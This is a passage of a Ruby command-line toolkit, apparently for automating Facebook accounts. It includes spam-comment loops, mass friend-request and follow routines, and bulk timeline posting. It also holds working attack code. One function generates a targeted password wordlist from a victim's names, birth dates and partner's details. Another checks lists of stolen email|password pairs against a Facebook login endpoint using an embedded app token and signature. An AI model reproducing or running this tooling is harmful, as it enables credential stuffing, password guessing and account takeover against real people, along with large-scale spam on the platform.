    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  end
end
    
def SpamComment()
  system ('clear')
  s = 0
  f = 0
  puts ($logo)  
  puts ("#{$w}[!] Use <> For New Line")
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Post Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Comment : ")
  body = gets.chomp!
  sub = body.tr("<>","\n")
  msg = ERB::Util.url_encode(sub)
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  #puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?")
  if a.key? ('from')
    tik ("#{$w}[+] Posted By #{a['from']['name']}")
    puts ("#{$w}#{'═'*52}")
    limit.times do
      b = Request("POST","#{id}/comments?message=#{msg}")
      if b.key? ('id')
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...8]}... #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...8]}... #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  else
    puts ("#{$y}[!] Post Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  end
end

def AddFriendMenu()
  system ("clear")
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Add Friend From Target Id")
  puts ("#{$w}║-> 2. Add Friend From Friend")
  puts ("#{$w}║-> 3. Add Friend From File Id")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when '1'
      AddTarget()
    when '2'
      AddFrind()
    when '3'
      AddFile()
    when '0'
      Bot()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      AddFriendMenu()
  end
end

def AddTarget()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp!
  a = Request("#{id}?")
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  if a.key? ('name')
    b = Request("POST","me/friends/#{id}?")
    if b == true
      puts ("#{$g}[✓] Name : #{a['name']}")
      puts ("#{$g}[✓] Status : Success")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      AddFriendMenu()
    else
      puts ("#{$y}[!] Name : #{a['name']}")
      puts ("#{$y}[!] Status : Failed")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      AddFriendMenu()
    end
  else
    puts ("#{$y}[!] User Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  end
end

def AddFrind()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Public Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?fields=friends.limit(#{limit})")
  if a.key? ('error')
    puts ("#{$y}[!] User Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  elsif !a.key? ('friends')
    puts ("#{$y}[!] There are no friends on the account")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  else
    for i in a['friends']['data']
      b = Request("POST","me/friends/#{i['id']}")
      if b == true
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{i['name']} #{$w}-> #{$y}#{i['id']}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{i['name']} #{$w}-> #{$y}#{i['id']}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  end
end

def AddFile()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] File Id : ")
  file = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  if File.file? (file)
    files = File.readlines(file, chomp: true).uniq
    for i in files[0...limit]
      a = Request("#{i}?")
      next if a.key? ('error')
      b = Request("POST","me/friends/#{i}?")
      if b == true
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  else
    puts ("#{$y}[!] File Not Found!")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  end
end

def FollowMenu()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Follow target Id")
  puts ("#{$w}║-> 2. Follow From friend")
  puts ("#{$w}║-> 3. Follow Friend from Friend")
  puts ("#{$w}║-> 4. Follow From File Id")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when '1'
      FollowTarget()
    when '2'
      FollowFriend()
    when '3'
      FollowFromFriend()
    when '4'
      FollowFile()
    when '0'
      Bot()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      FollowMenu()
  end
end

def FollowTarget()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp!
  tik("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?")
  if a.key? ('error')
    puts ("#{$y}[!] User Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  else
    b = Request("POST","#{id}/subscribers?")
    if b == true
      puts ("#{$g}[✓] Name : #{a['name']}")
      puts ("#{$g}[✓] Status : Success")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      FollowMenu()
    else
      puts ("#{$y}[!] Name : #{a['name']}")
      puts ("#{$y}[!] Status : Failed")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      FollowMenu()
    end
  end
end

def FollowFriend()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading...")
  puts ("#{$w}#{'═'*52}")
  a = Request("me/friends?limit=#{limit}")
  abort ("#{$y}[!] Error") if a.key? ('error')
  for i in a['data']
    id = i['id']
    name = i['name']
    b = Request("POST","#{id}/subscribers?")
    if b == true
      s += 1
      puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
    else
      f += 1
      puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
    end
  end
  puts ("#{$w}#{'═'*52}")
  puts ("#{$g}[✓] Succes : #{s}")
  puts ("#{$y}[!] Failed : #{f}")
  puts ("#{$w}[+] Total  : #{s + f}#{$a}")
  print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
  FollowMenu()
end

def FollowFromFriend()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Public Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?fields=friends.limit(#{limit})")
  if a.key? ('error')
    puts ("#{$y}[!] User Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  elsif !a.key? ('friends')
    puts ("#{$y}[!] There are no friends on the account")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  else
    for i in a['friends']['data']
      name = i['name']
      id = i['id']
      b = Request("POST","#{id}/subscribers?")
      if b == true
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  end
end

def FollowFile()
  s = 0
  f = 0
  system ("clear")
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] File Id : ")
  file = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  if File.file? (file)
    files = File.readlines(file, chomp: true).uniq
    for i in files[0...limit]
      a = Request("#{i}?")
      next if a.key? ('error')
      b = Request("POST","#{a['id']}/subscribers?")
      if b == true
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  else
    puts ("#{$y}[!] File Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  end
end

def SharePost(link)
  system ("clear")
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Share To Facebook")
  puts ("#{$w}║-> 2. Share on a Friend's Timeline")
  puts ("#{$w}║-> 3. Share on a Page")
  puts ("#{$w}║-> 4. Share in WhatsApp")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      msg = ERB::Util.url_encode(body)
      req = Request("POST","me/feed?link=#{link}&message=#{msg}")
      if req.key? ('id')
        puts ("#{$g}[✓] Succes  : #{req['id']}")
      else
        puts ("#{$y}[!] Failed  : nil")
      end
    when '2'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}[!] Use @tag to mention users")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      print ("#{$w}[+] Limit : ")
      limit = gets.to_i
      puts ("#{$w}#{'═'*52}")
      a = Request("me?fields=friends.limit(#{limit})")
      if a.key? ('error')
        puts (a)
        abort ("#{$r}[!] Error")
      elsif !a.key? ('friends')
         puts ("#{$y}[!] Your Account Has No Friends")
      else
        for i in a['friends']['data']
          id = i['id']
          name = i['name']
          user = '@['+id+':]'
          body = body.gsub("@tag",user)
          body = body.gsub("<>","\n")
          msg = ERB::Util.url_encode(body)
          b = Request("POST","#{id}/feed?message=#{msg}&link=#{link}")
          #puts b
          if b.key? ('id')
            s += 1
            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
          else
            f += 1
            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
          end
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      end
    when '3'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      print ("#{$w}[+] Limit : ")
      limit = gets.to_i
      tik ("#{$w}[+] Loading....")
      msg = ERB::Util.url_encode(body)   
      puts ("#{$w}#{'═'*52}")
      a = Request("me/accounts?fields=name,access_token&limit=#{limit}")
      if !a.key? ('data')
        puts (a)
        abort ("#{$r}[!] Error")
      elsif a['data'].empty?
        puts ("#{$y}[!] Your Account Doesn't Have a Page")
      else
        for i in a['data']
          name = i['name']
          id = i['id']
          token = i['access_token']
          b = Request("POST",token=token,"#{id}/feed?link=#{link}&message=#{msg}")
          if b.key? ('id')
            s += 1
            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
          else
	    f += 1
            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
          end
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      end
    when '4'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      code = system ("xdg-open --chooser whatsapp://send?text=#{link}")
      if code
        puts ("#{$g}[✓] Successfully Opening the WhatsApp Application")
      else
        puts ("#{$y}[!] Failed to Open the WhatsApp Application")
      end
    else
      puts ("#{$y}[!] Invalid Input")
  end
end

def lain()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Write Status")
  puts ("#{$w}║-> 2  Write Timeline")
  puts ("#{$w}║-> 3. Create Wordlist")
  puts ("#{$w}║-> 4. Account Checker")
  puts ("#{$w}║-> 5. List of Groups")
  puts ("#{$w}║-> 6. Access Token")
  puts ("#{$w}║-> 7. Frofil Guard")
  puts ("#{$w}║-> 8. Download Video")
  puts ("#{$w}║-> 9. Fanpage")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$w}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      msg = ERB::Util.url_encode(body)
      post = Request("POST","me/feed?message=#{msg}")
      puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : nil") if !post.key? ('id')
      puts ("#{$w}[#{$g}✓#{$w}] Succes  : #{post['id']}") if post.key? ('id')
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '2'
      meet = true
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Friend Id/Username : ")
      user = gets.chomp!
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      tik ("#{$w}[+] Loading...")
      msg = ERB::Util.url_encode(body)
      puts ("#{$w}#{'═'*52}")
      a = Request("me/friends?fields=name,id,username")
      if !a.to_s.include? (user)
        puts ("#{$y}[!] Friends Not Found")
      else
        for i in a['data']
          name = i['name']
          username = i['username']
          id = i['id']
          if user == id or user == username
            meet = false
            post = Request("POST","#{id}/feed?message=#{msg}")
            if post.key? ('id')
              puts ("#{$w}[#{$g}✓#{$w}] Name   : #{name}")
              puts ("#{$w}[#{$g}✓#{$w}] FBID   : #{id}")
              puts ("#{$w}[#{$g}✓#{$w}] User   : #{username}")
              puts ("#{$w}[#{$g}✓#{$w}] Status : Success")
            else
              puts ("#{$w}[#{$y}!#{$w}] Name   : #{name}")
              puts ("#{$w}[#{$y}!#{$w}] FBId   : #{id}")
              puts ("#{$w}[#{$y}!#{$w}] User   : #{username}")
              puts ("#{$w}[#{$y}!#{$w}] Status : Failed")
            end
          end
        end
      end
      puts ("#{$y}[!] Friends Not Found") if meet
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '3'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] First Name : ")
      a = gets.chomp!
      print ("#{$w}[+] Middle Name : ")
      b = gets.chomp!
      print ("#{$w}[+] Last Name : ")
      c = gets.chomp!
      print ("#{$w}[+] Nick Name : ")
      d = gets.chomp!
      print ("#{$w}[+] Date of birth (DDMMYY) : ")
      e = gets.chomp!
      f = e[0...2]
      g = e[2...4]
      h = e[4...]
      puts ("#{$w}═"*52)
      puts ("#{$w}[!] SKIP IF TARGET SINGLES")
      print ("#{$w}[+] Girlfriend Name : ")
      i = gets.chomp!
      print ("#{$w}[+] Girlfriend Nickname : ")
      j = gets.chomp!
      print ("#{$w}[+] Date of birth (DDMMYY) : ")
      k = gets.chomp!
      l = k[0...2]
      m = k[2...4]
      n = k[4...]
      password = "%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % [a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k]
      puts ("#{$w}[+] Creating Files...")
      save = a + '.txt'
      File.open(save,'w') do |data|
        tik("#{$w}[+] Pleace Wait....")
        data << password
        100.times{|x_x| data << a + x_x.to_s + "\n"}
        100.times{|x_x| data << i + x_x.to_s + "\n"}
        100.times{|x_x| data << d + x_x.to_s + "\n"}
        100.times{|x_x| data << j + x_x.to_s + "\n"}
      end
      puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success "+save)
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '4'
      ok = 0
      cp = 0
      die = 0
      system ('clear')
      puts ($logo)
      puts ("#{$g}[ INFO ] SEPERATOR id | password")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] File : ")
      file = gets.chomp!
      if File.file? (file)
        files = File.readlines(file, chomp: true).uniq
        puts ("#{$w}[+] Total #{files.length} Account")
        puts ("#{$w}[+] START...")
        puts ("#{$w}#{'═'*52}")
        for i in files
          sep = i.split('|')
          email = sep.first
          pass = sep.last
          url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=#{email}&locale=en_US&password=#{pass}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
          req = URI.open(url,'User-Agent'=>$user_agent).read()
          res = JSON.parse(req)
          if res.key? ('access_token')
            ok += 1
            puts ("#{$g}[OK✓] #{email} | #{pass}")
          elsif res.key? ('error_msg') and res['error_msg'].include?  ('www.facebook.com')
            cp += 1
            puts ("#{$y}[CP+] #{email} | #{pass}")
          else
            die += 1
            puts ("#{$r}[DIE] #{email} | #{pass}")
          end
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Total OK  : #{ok}")
        puts ("#{$y}[+] Total CP  : #{cp}")
        puts ("#{$r}[!] Total DIE : #{die}")
      else
        puts ("#{$y}[+] File Not Found")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '5'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] From #{$name}")
      puts ("#{$w}[+] START...")
      puts ("#{$w}#{'═'*52}")
      a = Request("me/groups?limit=5000")
      if !a.key? ('data')
        puts (a)
        abort ("#{$r}[!] Error")
      elsif a['data'].empty?
        puts ("#{$y}[!] There are no groups in your account")
      else
        b = a['data'].each{|i|
          puts ("#{$g}[✓] Group Name : #{i['name']}")
          puts ("#{$g}[✓] Group Id   : #{i['id']}")
          puts ("#{$w}#{'═'*52}")
        }
        puts ("#{$g}[✓] Total Groups : #{b.length}")
      end
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '6'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("#{$w}[+] Your Access Token : #{$token}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '7'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      puts ("║-> #{$w}1. Enable")
      puts ("║-> #{$w}2. Disable")
      puts ("║-> #{$g}0. Back")
      print ("#{$w}╚═#{$r}▶#{$w}")
      mana = gets.chomp!
      if mana == '1'
        Guard()
      elsif mana == '2'
        Guard(on = false)
      else
        lain()
      end
    when '8'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Video Id : ")
      id = gets.chomp!
      puts ("#{$w}[+] Loading...")
     # puts ("#{$w}#{'═'*52}")
      a = Request("v10.0/#{id}?fields=source,length,from")
      save = "Facebook-#{id}.mp4"
      if a.key? ('source')
        uri = URI(a['source'])
        Net::HTTP.start(uri.hostname,uri.port,:use_ssl => true) do |http|
          puts ("#{$w}[+] Downloading Video From #{a['from']['name']}")
          File.open(save, "wb") {|f|
            http.get(uri) do |str|
              f.write(str)
            end
          }
        end
        size = File.size(save)
        durasi = Time.at(a['length']).utc.strftime("%H:%M:%S")
        puts ("#{$w}[#{$g}✓#{$w}] Download Complete")
        puts ("#{$w}[#{$g}✓#{$w}] File Name : #{File.basename(save)}")
        puts ("#{$w}[#{$g}✓#{$w}] File Size : #{size}")
        puts ("#{$w}[#{$g}✓#{$w}] File Path : #{File.realpath(save)}")
        puts ("#{$w}[#{$g}✓#{$w}] Duration  : #{durasi}")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        lain()
      else
        puts ("#{$y}[!] Invalid Video Id ")
        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        lain()
      end
    when '9'
      PageMenu()
    when '0'
      menu()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      lain()
  end
end

def Guard(on = true)
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % [on, $id]
  headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth '+$token}
  uri = URI('https://graph.facebook.com/graphql')
  https = Net::HTTP.new(uri.host,uri.port)
  https.use_ssl = true
  req = Net::HTTP::Post.new(uri.path, headers)
  req.body = data
  res = https.request(req)
  body = res.body
  puts (body)
  if body.include? ('"is_shielded":true')
    puts ("#{$g}[✓] Activated")
  elsif body.include? ('"is_shielded":false')
    puts ("#{$y}[+] Deactivated")
  else
    puts ("#{$r}[!] Error")
  end
  print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
  lain()
end

def PageMenu()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Publish a Post")
  puts ("#{$w}║-> 2. Publish a Link")
  puts ("#{$w}║-> 3. Comment Post")
  puts ("#{$w}║-> 4. Spam Comments")
  puts ("#{$w}║-> 5. Delete Post")
  puts ("#{$w}║-> 6. Access Token")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("#{$w}╚═#{$r}▶#{$w}")
  mana = gets.chomp!
  case mana
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp! ; id = id.tr(" ","")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}
      uri = URI("https://graph.facebook.com/#{id}/feed")
      data = {"message"=>body,"access_token"=>token[0]}
      req = Net::HTTP.post_form(uri,data)
      post = JSON.parse(req.body)
      puts ("#{$w}[#{$g}✓#{$w}] Success : #{post['id']}") if post.key? ('id')
      puts ("#{$w}[#{$y}!#{$w}] Failed  : nil") if !post.key? ('id')
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '2'
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp! ; id = id.tr(" ","")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      print ("#{$w}[+] Link : ")
      link = gets.chomp!
      body = body.tr("<>","\n")
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}
      uri = URI("https://graph.facebook.com/#{id}/feed")
      data = {"message"=>body,"access_token"=>token[0],"link"=>link}
      req = Net::HTTP.post_form(uri,data)
      post = JSON.parse(req.body)
      puts ("#{$w}[#{$g}✓#{$w}] Success : #{post['id']}") if post.key? ('id')
      puts ("#{$w}[#{$y}!#{$w}] Failed  : nil") if !post.key? ('id')
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      PageMenu()
    when '3'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Target Must Be Page")
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Your Page Id : ")
      id = gets.chomp! ; id = id.tr(" ","")
      print ("#{$w}[+] Target Id : ")
      target = gets.chomp!
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      msg = body.tr("<>","\n")
      req = Request("me/accounts?fields=name,access_token")
      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
      puts ("#{$w}[!] CTRL + C TO STOP")
      puts ("#{$w}#{'═'*52}")
      if token.match? ('EAA')
        uri = URI("https://graph.facebook.com/v1.0/#{target}?fields=feed.limit=5000&access_token=#{token}")
        r = Net::HTTP.get(uri)
        a = JSON.parse(r)
        if a.key? ('error')
          puts a
          puts ("#{$y}[!] Target Not Found")
        elsif a['feed']['data'].empty?
          puts ("#{$y}[+] No Posts")
        else
          for i in a['feed']['data']
            begin
              uri = URI("https://graph.facebook.com/#{i['id']}/comments")
              data = {"message"=>msg,"access_token"=>token}
              post = Net::HTTP.post_form(uri,data).body
              res = JSON.parse(post)
              if res.key? ('id')
                s += 1
                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes -> #{i['id']}")
              else
                f += 1
                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{i['id']}")
              end
            rescue Interrupt
              puts ("\n")
              break
            end
          end
          puts ("#{$w}#{'═'*52}")
          puts ("#{$g}[✓] Succes : #{s}")
